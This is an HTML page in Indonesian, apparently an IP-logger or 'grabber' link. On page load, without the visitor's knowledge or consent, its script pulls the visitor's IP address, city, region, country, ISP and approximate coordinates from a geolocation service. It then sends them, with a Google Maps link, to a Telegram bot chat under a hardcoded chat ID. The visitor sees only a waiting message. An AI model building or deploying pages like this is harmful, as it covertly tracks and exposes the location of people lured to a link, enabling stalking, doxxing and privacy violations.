<!DOCTYPE html>
<html>
<head>
  <title>Pelacak IP & Lokasi</title>
  <meta charset="UTF-8" />
</head>
<body>
  <h2>Memproses pelacakan lokasi...</h2>
  <p id="status">Mohon tunggu...</p>

  <script>
    const botToken = ''; // Ganti dengan token bot Telegrammu
    const chatId = '7600526426';     // Ganti dengan chat ID Telegrammu

    async function sendTelegramMessage(text) {
      try {
        const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: text,
            parse_mode: 'Markdown',
            disable_web_page_preview: true
          })
        });
        const data = await res.json();
        if (!data.ok) {
          console.error('Gagal kirim pesan:', data);
          document.getElementById('status').innerText = 'Gagal kirim pesan ke Telegram.';
        } else {
          document.getElementById('status').innerText = 'Lokasi berhasil dikirim!';
        }
      } catch (e) {
        console.error('Error kirim pesan:', e);
        document.getElementById('status').innerText = 'Terjadi error saat kirim pesan.';
      }
    }

    async function trackLocation() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();

        const ip = data.ip || 'N/A';
        const city = data.city || 'N/A';
        const region = data.region || 'N/A';
        const country = data.country_name || 'N/A';
        const org = data.org || 'N/A';
        const timezone = data.timezone || 'N/A';
        const lat = data.latitude || 'N/A';
        const lon = data.longitude || 'N/A';
        const timeNow = new Date().toLocaleString();

        const message =
`🌍 *Pengunjung Baru!*

📡 IP: \`${ip}\`
🏙️ Kota: ${city}
🗺️ Wilayah: ${region}
🌐 Negara: ${country}
📍 Koordinat: ${lat}, ${lon}
🏢 ISP/Org: ${org}
🕒 Waktu Akses: ${timeNow}
⏱ Zona Waktu: ${timezone}
🗺️ [Lihat di Google Maps](https://www.google.com/maps?q=${lat},${lon})`;

        // Kirim ke Telegram
        await sendTelegramMessage(message);

      } catch (e) {
        console.error('Error dapatkan lokasi:', e);
        document.getElementById('status').innerText = 'Gagal mengambil lokasi.';
      }
    }

    // Jalankan otomatis saat halaman dibuka
    trackLocation();
  </script>
</body>
</html>
